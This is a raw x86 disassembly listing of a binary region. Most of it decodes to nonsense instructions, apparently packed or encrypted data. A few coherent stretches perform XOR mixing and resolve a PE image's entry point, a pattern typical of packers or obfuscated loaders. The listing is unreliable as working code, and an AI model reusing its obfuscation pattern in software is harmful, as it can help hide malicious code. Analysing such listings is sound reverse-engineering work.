  4180da:	push   ebx
  4180db:	jp     0x418144
  4180dd:	jb     0x418135
  4180df:	add    esp,ecx
  4180e1:	jmp    0xe53cc5b2
  4180e6:	pop    eax
  4180e7:	jo     0x418138
  4180e9:	jnp    0x418073
  4180eb:	fwait
  4180ec:	es loopne 0x418072
  4180ef:	xchg   BYTE PTR [edx+0x70],dl
  4180f2:	cwde   
  4180f3:	jl     0x41814b
  4180f5:	and    dl,BYTE PTR [ebx-0x57]
  4180f8:	sti    
  4180f9:	lock pop es
  4180fb:	xchg   esp,eax
  4180fc:	pop    edx
  4180fd:	adc    al,0xf5
  4180ff:	imul   ecx,DWORD PTR [esi-0x60128280],0xffffffa8
  418106:	lods   eax,DWORD PTR ds:[esi]
  418107:	and    BYTE PTR [edx],cl
  418109:	mov    bl,0x82
  41810b:	lock imul eax,DWORD PTR [edx],0xffffff85
  41810f:	inc    ebx
  418110:	jge    0x41813a
  418112:	push   ecx
  418113:	and    esi,esi
  418115:	fcom   DWORD PTR [eax+0x23]
  418118:	je     0x418169
  41811a:	ds sub ch,cl
  41811d:	cmp    DWORD PTR [edx+0x547bcff2],0x599f5ae5
  418127:	or     bh,bh
  418129:	lea    edi,[esi+0x56]
  41812c:	lea    esp,[edx+0x3c]
  41812f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418130:	pop    ebp
  418131:	mov    ds:0xeaf9911f,al
  418136:	hlt    
  418137:	mov    BYTE PTR [edx+0x32a5fc32],bh
  41813d:	sbb    ebx,esi
  41813f:	xchg   esi,eax
  418140:	xor    ecx,DWORD PTR [ecx]
  418142:	cmc    
  418143:	gs push ds
  418145:	mov    dl,0xbc
  418147:	bound  ebp,QWORD PTR [esi-0x1a]
  41814a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41814b:	cwde   
  41814c:	std    
  41814d:	jmp    0xa0d8:0xd0aa1374
  418154:	cwde   
  418155:	dec    ebx
  418156:	jmp    FWORD PTR [ecx+0x2]
  418159:	fisub  DWORD PTR [ebx+0x62]
  41815c:	or     dh,BYTE PTR [ecx-0x36]
  41815f:	gs lock out 0xd2,eax
  418163:	cmp    BYTE PTR [ebx+0x5940af22],bh
  418169:	push   ecx
  41816a:	xchg   ebx,eax
  41816b:	jae    0x4181de
  41816d:	je     0x4181c5
  41816f:	ins    DWORD PTR es:[edi],dx
  418170:	push   0xffffffa6
  418172:	mov    ecx,0x27cac0a3
  418177:	inc    esi
  418178:	neg    DWORD PTR [ebp+0x61]
  41817b:	ja     0x41812f
  41817d:	ror    BYTE PTR [edi],0x33
  418180:	(bad)  
  418181:	nop
  418182:	or     DWORD PTR [esi],esp
  418184:	iret   
  418185:	aam    0x2e
  418187:	or     ch,ch
  418189:	or     ebx,DWORD PTR [ebp+0x7182f227]
  41818f:	cmp    bl,BYTE PTR [edx-0xff64915]
  418195:	in     eax,dx
  418196:	mov    esi,DWORD PTR [ebp+0xc]
  418199:	xor    ecx,eax
  41819b:	xor    esi,eax
  41819d:	lea    ecx,[esi+ecx*1+0x327298]
  4181a4:	xor    ecx,eax
  4181a6:	jmp    0x4184c0
  4181ab:	sar    BYTE PTR [esi],0xce
  4181ae:	xlat   BYTE PTR ds:[ebx]
  4181af:	(bad)  
  4181b0:	xlat   BYTE PTR ds:[ebx]
  4181b1:	(bad)
  4181b4:	loope  0x41818c
  4181b6:	pop    esp
  4181b7:	ficom  WORD PTR [ecx+0x34191b68]
  4181bd:	jg     0x418237
  4181bf:	jnp    0x41823f
  4181c1:	js     0x41823b
  4181c3:	dec    ebx
  4181c4:	fidiv  DWORD PTR [ebx-0x3c]
  4181c7:	sub    eax,0x9b0e1223
  4181cc:	ins    BYTE PTR es:[edi],dx
  4181cd:	xchg   BYTE PTR [esi+0xd207219],dl
  4181d3:	pop    esi
  4181d4:	dec    edi
  4181d5:	std    
  4181d6:	cmp    al,0x89
  4181d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181d9:	sub    BYTE PTR [ecx],ch
  4181db:	jns    0x41823b
  4181dd:	cli    
  4181de:	popa   
  4181df:	sub    dl,BYTE PTR [ecx-0x74e5df31]
  4181e5:	int3   
  4181e6:	or     al,0x55
  4181e8:	daa    
  4181e9:	int    0xbc
  4181eb:	ret    0x670f
  4181ee:	and    eax,0x601f7b4f
  4181f3:	mov    al,0xb
  4181f5:	js     0x418203
  4181f7:	mov    eax,?
  4181f9:	aaa    
  4181fa:	or     ecx,esi
  4181fc:	std    
  4181fd:	mov    esi,0x528df0a7
  418202:	sub    edi,DWORD PTR [esi+0x5b]
  418205:	mov    cl,0x2a
  418207:	retf   0x4ed8
  41820a:	scas   al,BYTE PTR es:[edi]
  41820b:	push   ecx
  41820c:	stc    
  41820d:	out    0xd6,eax
  41820f:	sub    eax,0x8e3ff8f2
  418214:	sub    bh,BYTE PTR [esi+0x36a730ef]
  41821a:	(bad)  
  41821b:	jp     0x4181b3
  41821d:	push   es
  41821e:	popf   
  41821f:	jo     0x41826c
  418221:	inc    ecx
  418222:	sar    DWORD PTR [ebx-0x1],cl
  418225:	push   ss
  418226:	xor    al,0x8e
  418228:	ss popa 
  41822a:	inc    edx
  41822b:	shr    DWORD PTR ds:0x348f8f,0x25
  418232:	outs   dx,DWORD PTR ds:[esi]
  418233:	sub    al,ch
  418235:	int    0xbd
  418237:	add    al,0x9b
  418239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41823a:	dec    ebx
  41823b:	fisubr DWORD PTR [eax+eax*8]
  41823e:	lock ret 0xcfbb
  418242:	retf   
  418243:	mov    edx,0xcf41c2e7
  418248:	jge    0x418234
  41824a:	call   0x51ac:0xd0078c33
  418251:	lock push 0xb8f5c885
  418257:	fdiv   DWORD PTR [ecx+ebx*1+0x5722efac]
  41825e:	dec    edx
  41825f:	push   eax
  418260:	mov    ds:0x33f76d67,al
  418265:	dec    edx
  418266:	mov    dl,0x19
  418268:	ret    0xf885
  41826b:	mov    BYTE PTR [edx],0xee
  41826e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41826f:	mov    DWORD PTR [edi-0x1a],0x31df4355
  418276:	xlat   BYTE PTR ds:[ebx]
  418277:	test   edx,edi
  418279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41827a:	daa    
  41827b:	fistp  QWORD PTR [eax+0x7c]
  41827e:	jmp    0x62a02da4
  418283:	sbb    eax,DWORD PTR [esi]
  418285:	jno    0x418213
  418287:	mov    ebx,0xf14954f1
  41828c:	js     0x418308
  41828e:	inc    ebx
  41828f:	es test al,0x0
  418292:	mov    ah,0x3f
  418294:	or     BYTE PTR [ecx-0x5e],dl
  418297:	pop    es
  418298:	cdq    
  418299:	mov    edi,0x8638d09f
  41829e:	pop    esp
  41829f:	mov    bl,0xf2
  4182a1:	mov    eax,ds:0x6e676ff8
  4182a6:	add    al,0x5e
  4182a8:	into   
  4182a9:	or     DWORD PTR ds:0xb338da61,ebp
  4182af:	jb     0x418321
  4182b1:	sbb    eax,0xd312a034
  4182b6:	sub    DWORD PTR [ebx-0x2c],edi
  4182b9:	sub    eax,0x32839a16
  4182be:	jmp    0x11d9:0x8756dd38
  4182c5:	pop    ss
  4182c6:	lods   eax,DWORD PTR ds:[esi]
  4182c7:	stos   DWORD PTR es:[edi],eax
  4182c8:	pop    es
  4182c9:	or     BYTE PTR [ebx+0x6f63ee1a],0x62
  4182d0:	push   edi
  4182d1:	arpl   di,si
  4182d3:	stos   DWORD PTR es:[edi],eax
  4182d4:	mov    bh,0xdc
  4182d6:	and    BYTE PTR [edi],0xa7
  4182d9:	jnp    0x418310
  4182db:	sbb    al,0x6a
  4182dd:	lea    eax,[esi+0x4847a20b]
  4182e3:	cmp    ch,ah
  4182e5:	inc    edi
  4182e6:	dec    edx
  4182e7:	rcl    DWORD PTR [eax],cl
  4182e9:	inc    edx
  4182ea:	shl    DWORD PTR [ebx+0x50abba0c],0x4b
  4182f1:	addr16 out 0xc1,al
  4182f4:	xor    BYTE PTR ds:0x2e5cbaa8,0xa4
  4182fb:	out    0xc6,al
  4182fd:	xchg   edx,eax
  4182fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4182ff:	cli    
  418300:	mul    DWORD PTR ds:0xca764a34
  418306:	loopne 0x4182ff
  418308:	fiadd  DWORD PTR [esi]
  41830a:	inc    eax
  41830b:	or     ch,BYTE PTR [edi+edx*1]
  41830e:	leave  
  41830f:	xchg   edi,eax
  418310:	sbb    DWORD PTR [ebx],ecx
  418312:	out    0xd9,eax
  418314:	mov    edi,0x5bc8b975
  418319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41831a:	imul   ebp,DWORD PTR [ebx+0x46],0xd534c655
  418321:	add    bh,BYTE PTR [eax]
  418323:	mov    ebp,0x3235ead2
  418328:	test   cl,bl
  41832a:	mov    edx,0xf7e3c95
  41832f:	pop    ss
  418330:	push   edx
  418331:	pop    ds
  418332:	lock mov esi,0xf4402464
  418338:	lock mov BYTE PTR [ecx-0xf],ah
  41833c:	stos   DWORD PTR es:[edi],eax
  41833d:	and    edx,edi
  41833f:	(bad)  
  418340:	cmp    DWORD PTR [eax+ecx*8+0x11],ebx
  418344:	pop    esi
  418345:	jmp    0x858c:0x13c4da7c
  41834c:	mov    ebp,0xe055dca6
  418351:	cmc    
  418352:	jno    0x418306
  418354:	mov    edx,0x7e1162a4
  418359:	test   eax,0xf13dfb74
  41835e:	pop    ecx
  41835f:	jbe    0x41830a
  418361:	repz das 
  418363:	cmp    DWORD PTR [edi-0x6a],eax
  418366:	pop    ebp
  418367:	icebp  
  418368:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418369:	xlat   BYTE PTR ds:[ebx]
  41836a:	cwde   
  41836b:	popf   
  41836c:	leave  
  41836d:	adc    ecx,DWORD PTR [edi]
  41836f:	xor    ecx,0xffffffc9
  418372:	ja     0x4183c3
  418374:	push   ss
  418375:	aas    
  418376:	ret    0x3dc8
  418379:	cmp    eax,0x9b266478
  41837e:	push   eax
  41837f:	mov    ecx,0x7f6920fc
  418384:	js     0x4183d5
  418386:	cli    
  418387:	mov    dh,0xdd
  418389:	push   cs
  41838a:	xor    BYTE PTR [bx+si+0x4c],dl
  41838e:	inc    ebx
  41838f:	shl    DWORD PTR [ebx+0x76f33a93],1
  418395:	inc    esp
  418396:	mov    bl,0xc
  418398:	call   0x1f21:0x1f6204e5
  41839f:	int    0xe9
  4183a1:	mov    bh,0x54
  4183a3:	or     al,dh
  4183a5:	popa   
  4183a6:	pop    ebx
  4183a7:	sbb    al,BYTE PTR [edi]
  4183a9:	aad    0x76
  4183ab:	xor    BYTE PTR [eax],ah
  4183ad:	int3   
  4183ae:	add    DWORD PTR [eax-0x42ca56a9],esp
  4183b4:	nop
  4183b5:	push   ecx
  4183b6:	sub    esi,ecx
  4183b8:	fistp  QWORD PTR [ecx+0x63]
  4183bb:	dec    ecx
  4183bc:	mov    esp,0xc717252c
  4183c1:	cwde   
  4183c2:	xchg   edx,eax
  4183c3:	mov    edx,?
  4183c5:	rol    BYTE PTR [esi],cl
  4183c7:	push   esi
  4183c8:	xor    edi,DWORD PTR [ecx-0x5d]
  4183cb:	cmp    DWORD PTR [edx],0x11
  4183ce:	or     BYTE PTR [edx+0x54],bl
  4183d1:	dec    ecx
  4183d2:	mov    al,ds:0xcf976d
  4183d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183d8:	or     al,0x5b
  4183da:	inc    esp
  4183db:	jge    0x4183b0
  4183dd:	inc    esi
  4183de:	xor    BYTE PTR [esi+ebp*1-0x50],bh
  4183e2:	out    dx,eax
  4183e3:	(bad)  
  4183e4:	xchg   esp,eax
  4183e5:	add    bl,BYTE PTR [ebx-0x54d9cc27]
  4183eb:	dec    esp
  4183ec:	pop    ebp
  4183ed:	mov    edx,0xcf43f251
  4183f2:	test   al,0x22
  4183f4:	jns    0x4183b2
  4183f6:	fnstcw WORD PTR [ebp-0x5431e790]
  4183fc:	inc    ecx
  4183fd:	sub    dl,BYTE PTR [edi-0x6e]
  418400:	(bad)  
  418401:	push   esi
  418402:	cmc    
  418403:	jo     0x41845c
  418405:	jp     0x4183db
  418407:	adc    DWORD PTR [edi-0x59],eax
  41840a:	add    DWORD PTR [ebp-0x6e904dbe],ebp
  418410:	xor    bl,BYTE PTR [ecx]
  418412:	xchg   esi,eax
  418413:	inc    esp
  418414:	mov    al,0x3e
  418416:	test   BYTE PTR [ecx],dh
  418418:	(bad)  
  418419:	jbe    0x41846d
  41841b:	mov    ebp,DWORD PTR [edx-0x47]
  41841e:	gs loop 0x418484
  418421:	in     al,dx
  418422:	or     eax,0x35ef3e74
  418427:	out    0x6f,eax
  418429:	jbe    0x41847b
  41842b:	out    0x7a,eax
  41842d:	mov    al,ds:0x2f3fe786
  418432:	mov    edi,0x1b4559b1
  418437:	mov    WORD PTR [ebx],cs
  418439:	push   0x23ce6606
  41843e:	sbb    al,0x3
  418440:	inc    ecx
  418441:	and    ecx,DWORD PTR [esi+0x2f]
  418444:	in     al,0x9
  418446:	icebp  
  418447:	mov    ds,esi
  418449:	adc    bl,BYTE PTR [edi-0x1b]
  41844c:	jl     0x418404
  41844e:	add    dh,ah
  418450:	cmp    bh,BYTE PTR [edx+0x48ef37df]
  418456:	out    dx,al
  418457:	(bad)  
  418458:	pushw  ss
  41845a:	mov    bl,0x7d
  41845c:	ss xor eax,0xbb958b8d
  418462:	push   cs
  418463:	cli    
  418464:	dec    edx
  418465:	lods   al,BYTE PTR ds:[esi]
  418466:	pop    ds
  418467:	rcr    DWORD PTR [edx+0x37bae33f],cl
  41846d:	push   cs
  41846e:	adc    bh,BYTE PTR [esi]
  418470:	jne    0x418461
  418472:	pushf  
  418473:	cdq    
  418474:	lea    ebp,[ebx]
  418476:	into   
  418477:	aam    0x81
  418479:	jns    0x41841a
  41847b:	or     DWORD PTR [ebp-0x32303ad0],eax
  418481:	cmp    ebp,edx
  418483:	mov    eax,0x7fee7397
  418488:	fsub   st,st(4)
  41848a:	mov    ebp,0xe480848
  41848f:	push   ds
  418490:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418491:	jg     0x4184d9
  418493:	dec    edi
  418494:	stc    
  418495:	mov    eax,ds:0x8c5ad5e0
  41849a:	pop    eax
  41849b:	or     eax,0x5fc06e11
  4184a0:	mov    ebp,0x60bf9fa8
  4184a5:	sbb    cl,BYTE PTR [ebx+0x78]
  4184a8:	pusha  
  4184a9:	fbld   TBYTE PTR [edi+edi*8]
  4184ac:	stos   DWORD PTR es:[edi],eax
  4184ad:	in     al,dx
  4184ae:	adc    DWORD PTR [ebp+0x53b2ae6],0xffffffb7
  4184b5:	outs   dx,BYTE PTR ds:[esi]
  4184b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184b7:	lods   al,BYTE PTR ds:[esi]
  4184b8:	cmp    ecx,DWORD PTR [ebx+0x7fde2ccc]
  4184be:	inc    eax
  4184bf:	into   
  4184c0:	cmp    ecx,0xf89c8528
  4184c6:	jne    0x417e12
  4184cc:	jmp    0x418819
  4184d1:	jmp    0x4187eb
  4184d6:	int3   
  4184d7:	les    edi,FWORD PTR [edi+ecx*8]
  4184da:	aam    0xd7
  4184dc:	ror    ebx,cl
  4184de:	mov    esi,0x15ec6d48
  4184e3:	add    al,0xec
  4184e5:	jle    0x4184fb
  4184e7:	cmp    DWORD PTR [edi+0x78],edi
  4184ea:	jnp    0x41856a
  4184ec:	js     0x418566
  4184ee:	or     DWORD PTR [edi+edi*8-0x56cf4868],ecx
  4184f5:	sub    ah,bl
  4184f7:	cmp    ecx,DWORD PTR [edi]
  4184f9:	push   ds
  4184fa:	xor    ebx,ecx
  4184fc:	jnp    0x418492
  4184fe:	outs   dx,DWORD PTR ds:[esi]
  4184ff:	pop    ebx
  418500:	xor    BYTE PTR [eax-0x4f],bl
  418503:	fs lock div eax
  418507:	(bad)  
  418508:	(bad)  
  41850a:	sti    
  41850b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41850c:	xor    DWORD PTR [ecx-0x31dc77a],0x8f9501c7
  418516:	loope  0x41853e
  418518:	cld    
  418519:	mov    eax,ds:0x7987acd
  41851e:	sahf   
  41851f:	inc    ebx
  418520:	leave  
  418521:	jo     0x4184be
  418523:	int3   
  418524:	sti    
  418525:	lea    esp,[edx]
  418527:	loopne 0x418559
  418529:	or     esi,DWORD PTR [edx+0x40]
  41852c:	lods   al,BYTE PTR ds:[esi]
  41852d:	xlat   BYTE PTR ds:[ebx]
  41852e:	mov    ebx,0xf381cd54
  418533:	cs inc edx
  418535:	mov    ds:0x75fdc92f,eax
  41853a:	rdmsr  
  41853c:	mov    al,ds:0x8a2c61df
  418541:	pop    edi
  418542:	fistp  QWORD PTR [ebx+ebp*8]
  418545:	ss or  ah,ah
  418548:	ja     0x418556
  41854a:	pop    esp
  41854b:	sti    
  41854c:	retf   
  41854d:	popa   
  41854e:	in     al,0x92
  418550:	shr    esi,cl
  418552:	sbb    DWORD PTR [edi],0xffffffde
  418555:	push   0x4201d29a
  41855a:	jmp    0x9ef98ead
  41855f:	leave  
  418560:	xor    al,BYTE PTR [eax+0x4f78c59]
  418566:	mov    cl,0xb9
  418568:	neg    BYTE PTR [edi]
  41856a:	rep ins DWORD PTR es:[edi],dx
  41856c:	into   
  41856d:	pop    ss
  41856e:	dec    ebp
  41856f:	sub    ebx,DWORD PTR [esi]
  418571:	add    DWORD PTR [ebx+0x53],ecx
  418574:	cmp    DWORD PTR [eax],ebx
  418576:	cmp    cl,dh
  418578:	(bad)  [edi-0x35]
  41857b:	ret    0xc776
  41857e:	pop    es
  41857f:	sbb    eax,0xbb3fe62
  418584:	inc    ecx
  418585:	inc    esi
  418586:	cmp    al,0x9d
  418588:	retf   0xcfc9
  41858b:	mov    bh,0x65
  41858d:	mov    ch,0x9d
  41858f:	xchg   DWORD PTR [eax],edi
  418591:	adc    bh,BYTE PTR [edx-0x59b3ea94]
  418597:	mov    esi,0xbdfde43c
  41859c:	test   DWORD PTR [esi],0x2f75c5d
  4185a2:	aam    0xbd
  4185a4:	test   esi,0x15ff3544
  4185aa:	cld    
  4185ab:	pop    edi
  4185ac:	scas   al,BYTE PTR es:[edi]
  4185ad:	dec    ebp
  4185ae:	inc    esi
  4185af:	stos   BYTE PTR es:[edi],al
  4185b0:	es cmc 
  4185b2:	dec    BYTE PTR [esi]
  4185b4:	lods   eax,DWORD PTR ds:[esi]
  4185b5:	ret    0x6a3f
  4185b8:	mov    dh,0x63
  4185ba:	xchg   edx,eax
  4185bb:	ret    
  4185bc:	inc    edi
  4185bd:	jne    0x418604
  4185bf:	mov    esp,0x1028d265
  4185c4:	add    esi,DWORD PTR [esi+0x7b]
  4185c7:	jmp    0xc7f178e6
  4185cc:	gs sbb al,0x12
  4185cf:	push   es
  4185d0:	mov    ah,0x36
  4185d2:	out    dx,al
  4185d3:	add    bl,BYTE PTR [edi+eax*4-0x6a]
  4185d7:	dec    eax
  4185d8:	rcr    BYTE PTR [edi-0x6b],1
  4185db:	ret    0x306d
  4185de:	mov    eax,ds:0x9d204c7b
  4185e3:	(bad)  
  4185e4:	retf   0xdf2
  4185e7:	imul   ebp,ecx,0xc3ed1e9f
  4185ed:	or     dl,cl
  4185ef:	add    al,0xe8
  4185f1:	sbb    BYTE PTR [ecx+esi*8-0x2d],0x64
  4185f6:	sub    al,BYTE PTR [ebp-0x28]
  4185f9:	cli    
  4185fa:	and    al,0x61
  4185fc:	fnstenv [ebp+0x7be8747d]
  418602:	cmp    ah,BYTE PTR [esp+ebx*8+0x108c0e4d]
  418609:	int3   
  41860a:	push   es
  41860b:	or     BYTE PTR [ebp-0x521007c9],0xeb
  418612:	jmp    0x4185df
  418614:	jb     0x4185cb
  418616:	in     eax,dx
  418617:	test   DWORD PTR [eax],ecx
  418619:	pop    esi
  41861a:	(bad)  
  41861b:	pop    esp
  41861c:	stos   BYTE PTR es:[edi],al
  41861d:	cmp    ebx,DWORD PTR [ebp+0x18]
  418620:	pop    esp
  418621:	cs repz push ebx
  418624:	push   cs
  418625:	cs call 0xb21b:0x9faaacd7
  41862d:	call   0xfbc4e16c
  418632:	test   eax,0x71675bc5
  418637:	js     0x7774308d
  41863d:	test   DWORD PTR [edx-0x1c320649],ebx
  418643:	sbb    DWORD PTR [esi+0x1c452eb9],ecx
  418649:	jno    0x418653
  41864b:	jmp    0x41865b
  41864d:	xlat   BYTE PTR ds:[ebx]
  41864e:	jno    0x418640
  418650:	mov    edi,0x217602d
  418655:	xchg   edx,eax
  418656:	pop    ds
  418657:	dec    edi
  418658:	xchg   ebp,eax
  418659:	fisub  DWORD PTR [ecx-0x15]
  41865c:	mov    dh,0x1f
  41865e:	ins    BYTE PTR es:[edi],dx
  41865f:	loopne 0x4185fc
  418661:	sub    eax,0xf85a50d8
  418666:	dec    eax
  418667:	mov    cl,0x47
  418669:	enter  0x399,0x29
  41866d:	pop    edx
  41866e:	ds cmp eax,0x2f6cf9a7
  418674:	mov    al,0xd4
  418676:	or     al,0x3e
  418678:	and    al,0xcb
  41867a:	or     ecx,DWORD PTR ds:0x59cf1403
  418680:	pop    edx
  418681:	fs jge 0x41862c
  418684:	stc    
  418685:	stos   DWORD PTR es:[edi],eax
  418686:	mov    edi,0xb877f331
  41868b:	fucom  st(7)
  41868d:	xchg   ebx,eax
  41868e:	fs and al,ah
  418691:	push   ds
  418692:	imul   ebx,DWORD PTR [esi-0x3a],0xaa679e3f
  418699:	dec    edx
  41869a:	in     al,dx
  41869b:	sub    edx,DWORD PTR [eax]
  41869d:	fcomi  st,st(3)
  41869f:	(bad)  
  4186a0:	leave  
  4186a1:	sbb    DWORD PTR [edi-0x57f307ed],0xffffffcc
  4186a8:	(bad)  
  4186a9:	loopne 0x418647
  4186ab:	fidivr WORD PTR [eax-0xb82356c]
  4186b1:	mov    cl,0x67
  4186b3:	out    dx,al
  4186b4:	ins    DWORD PTR es:[edi],dx
  4186b5:	dec    esi
  4186b6:	and    ecx,esp
  4186b8:	ins    BYTE PTR es:[edi],dx
  4186b9:	rcl    BYTE PTR [ebp+0x0],cl
  4186bc:	pop    esi
  4186bd:	mov    edx,0xd5c05355
  4186c2:	test   BYTE PTR [edx],ch
  4186c4:	inc    ebp
  4186c5:	pop    esp
  4186c6:	sub    DWORD PTR ds:[esi+0x49],edx
  4186ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186cb:	dec    ebp
  4186cc:	cmp    al,0x7
  4186ce:	add    edi,edi
  4186d0:	fild   QWORD PTR ds:[esp+eax*1+0x152c704c]
  4186d8:	enter  0xdce6,0xac
  4186dc:	mov    BYTE PTR [ebx],0x1b
  4186df:	push   ecx
  4186e0:	xlat   BYTE PTR ds:[ebx]
  4186e1:	ret    0xb168
  4186e4:	pusha  
  4186e5:	lds    edi,FWORD PTR [edi-0x6c05c80c]
  4186eb:	test   al,0xdc
  4186ed:	adc    dl,BYTE PTR [esi-0x13aaa4e2]
  4186f3:	xor    DWORD PTR [esi+0x7b],edi
  4186f6:	inc    edx
  4186f7:	fnsave [ecx]
  4186f9:	jp     0x4186ed
  4186fb:	xchg   esi,eax
  4186fc:	jae    0x4186d4
  4186fe:	std    
  4186ff:	push   ss
  418700:	inc    edi
  418701:	in     eax,dx
  418702:	add    DWORD PTR [edx],0x4d
  418705:	icebp  
  418706:	fisub  DWORD PTR [esi+0x51]
  418709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41870a:	sti    
  41870b:	ficom  DWORD PTR [eax]
  41870d:	sub    al,0x44
  41870f:	shl    eax,cl
  418711:	sub    al,0xce
  418713:	popf   
  418714:	xor    ebx,DWORD PTR [ebx+eax*4+0x7c0b7cf]
  41871b:	sar    BYTE PTR [esi-0x12be7c47],1
  418721:	or     DWORD PTR [edi+0x2c72ba4],esi
  418727:	sahf   
  418728:	xchg   ebp,eax
  418729:	add    ebp,DWORD PTR [ebx-0x1f]
  41872c:	cmp    eax,0x8542a0eb
  418731:	mov    dl,0x1e
  418733:	add    eax,0x7a033298
  418738:	mov    esi,0xcb25292d
  41873d:	jbe    0x4186e1
  41873f:	enter  0x9da9,0x63
  418743:	scas   eax,DWORD PTR es:[edi]
  418744:	int    0x33
  418746:	mov    ch,0x27
  418748:	cld    
  418749:	lods   al,BYTE PTR ds:[esi]
  41874a:	rol    BYTE PTR [ecx],1
  41874c:	popf   
  41874d:	mov    esp,0xd81f2d62
  418752:	cmc    
  418753:	sub    ah,0xd
  418756:	pusha  
  418757:	sub    al,0x94
  418759:	call   0x49c84a49
  41875e:	xchg   dl,al
  418760:	xchg   ebp,eax
  418761:	(bad)  
  418762:	pop    ebx
  418763:	cmp    eax,0xb3c9bee8
  418768:	cld    
  418769:	arpl   WORD PTR [ebx+0x794768e8],bp
  41876f:	test   BYTE PTR [eax*1-0x67b9d3c5],al
  418776:	cmp    BYTE PTR [edx+0x1b6e59ba],bh
  41877c:	das    
  41877d:	mov    esi,0xfbaaee3b
  418782:	dec    ecx
  418783:	cmp    DWORD PTR [esi-0x3341927a],ebp
  418789:	mov    cl,0xad
  41878b:	inc    esp
  41878c:	sbb    bl,0xde
  41878f:	inc    ebp
  418790:	push   ecx
  418791:	(bad)  
  418792:	imul   eax,edx,0xb08e166b
  418798:	stos   DWORD PTR es:[edi],eax
  418799:	sbb    DWORD PTR [ebx+0x43],eax
  41879c:	cmp    bh,bh
  41879e:	loopne 0x41872a
  4187a0:	adc    al,0x22
  4187a2:	cs int3 
  4187a4:	mov    ch,0xb6
  4187a6:	cli    
  4187a7:	fwait
  4187a8:	push   esp
  4187a9:	test   eax,0x2d9a68ce
  4187ae:	scas   eax,DWORD PTR es:[edi]
  4187af:	mov    bh,0xb4
  4187b1:	add    bl,BYTE PTR [ebp-0x5d2e7f5]
  4187b7:	mov    ch,dh
  4187b9:	mov    esp,cs
  4187bb:	jbe    0x418774
  4187bd:	bnd call 0x4ae5dc3
  4187c3:	outs   dx,DWORD PTR ds:[esi]
  4187c4:	cs jge 0x4187e6
  4187c7:	xchg   esi,eax
  4187c8:	mov    ch,0xb
  4187ca:	cdq    
  4187cb:	outs   dx,BYTE PTR ds:[esi]
  4187cc:	scas   al,BYTE PTR es:[edi]
  4187cd:	mov    esi,DWORD PTR [edx]
  4187cf:	sbb    eax,0x4f0d437e
  4187d4:	aam    0x78
  4187d6:	in     al,0x6
  4187d8:	push   0x4ed8ef7d
  4187dd:	push   0x48b0f810
  4187e2:	mov    cs,ecx
  4187e4:	add    al,0x6b
  4187e6:	xchg   ecx,eax
  4187e7:	ins    DWORD PTR es:[edi],dx
  4187e8:	fist   DWORD PTR [ebx]
  4187ea:	xchg   esp,eax
  4187eb:	add    ecx,0xffcd8d68
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0xe64f1af2
  41883e:	dec    ebx
  41883f:	scas   eax,DWORD PTR es:[edi]
  418840:	pop    ss
  418841:	ds jg  0x4188bc
  418844:	jnp    0x4188c4
  418846:	js     0x4188c0
  418848:	imul   esi,DWORD PTR [esi+0x791c5536],0xd6e88e82
  418852:	clc    
  418853:	gs push cs
  418855:	int    0xa9
  418857:	sbb    al,0xc7
  418859:	cmp    edx,DWORD PTR [edx+0x2cea75b6]
  41885f:	xchg   esi,eax
  418860:	fild   QWORD PTR [eax+0x10]
  418863:	test   eax,0x96adf71c
  418868:	out    dx,eax
  418869:	push   ebp
  41886a:	imul   esp,ecx,0xffffffc5
  41886d:	push   cs
  41886e:	int    0xf3
  418870:	mov    eax,ds:0xfaedf37f
  418875:	adc    dl,BYTE PTR [ecx-0x3d9f2d58]
  41887b:	mov    ah,0x92
  41887d:	mov    ebx,0xb51900d6
  418882:	and    al,0xcb
  418884:	jmp    0x2d019c8c
  418889:	pushf  
  41888a:	mov    ebx,0x7ca7b2e5
  41888f:	shl    DWORD PTR [ecx-0x25],0x0
  418893:	fisubr WORD PTR [ebx-0x2fe2a8f1]
  418899:	lea    eax,[ebp+0x4f]
  41889c:	and    esi,0x72
  41889f:	sub    DWORD PTR [edi+0x56],ebp
  4188a2:	dec    ebx
  4188a3:	gs pop es
  4188a5:	stos   BYTE PTR es:[edi],al
  4188a6:	fs xchg ebp,eax
  4188a8:	rcl    ah,0x18
  4188ab:	xchg   ebx,eax
  4188ac:	das    
  4188ad:	pop    ss
  4188ae:	pop    eax
  4188af:	popf   
  4188b0:	(bad)  
  4188b1:	fmul   QWORD PTR [ebx]
  4188b3:	fisubr WORD PTR [ecx-0x5e]
  4188b6:	mov    ds:0xd46751a5,al
  4188bb:	sbb    BYTE PTR [ebx+0x6a234be7],cl
  4188c1:	xor    esi,eax
  4188c3:	repz test al,0xd4
  4188c6:	mov    bh,0x3b
